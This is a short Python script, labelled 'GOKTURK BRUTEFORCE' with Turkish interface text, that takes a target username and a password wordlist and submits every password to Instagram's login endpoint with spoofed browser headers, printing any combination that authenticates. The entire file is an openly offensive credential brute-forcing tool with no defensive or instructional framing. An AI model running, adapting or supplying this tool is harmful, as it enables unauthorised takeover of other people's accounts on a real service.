import requests
from itertools import cycle
from termcolor import colored
import time

url = "https://www.instagram.com/accounts/login/ajax/"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 1.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
           "Content-Type": "application/x-www-form-urlencoded",
           "X-Requested-With": "XMLHttpRequest",
           "Referer": "https://www.instagram.com/accounts/login/"}

def check_credentials(username, password):
    payload = {"username": username,
               "password": password}
    response = requests.post(url, data=payload, headers=headers)
    
    if response.status_code == 200:
        response_data = response.json()
        if response_data['authenticated']:
            print(colored(f"Başarılı: Kullanıcı adı {username} ve parola {password} geçerli.", 'green'))
        else:
            print(colored(f"Hatalı: Kullanıcı adı {username} ve parola {password} geçersiz.", 'red'))

def read_wordlist(file_name):
    with open(file_name, "r") as wordlist_file:
        wordlist = wordlist_file.readlines()
    return wordlist

print(colored("""

GOKTURK BRUTEFORCE
-----------------
versiyon 0.1
""", 'red'))

choice = input("1- Bruteforce başlat\n2- Çıkış\nSeçiminiz: ")

if choice == '1':
    username = input("Kullanıcı Adı: ")
    wordlist_file_name = input("Wordlist Dosyası: ")

    wordlist = read_wordlist(wordlist_file_name)

    for password in wordlist:
        password = password.strip()
        check_credentials(username, password)
        print(colored(f"{username} Kullanıcı Adına ait parola {password} deneniyor...", 'green'), end="\r")
        time.sleep(0.1)
        print("\r" * 75, end="") # Satır başını temizlemek için ekstra satır
else:
    print("Görüşürüz!")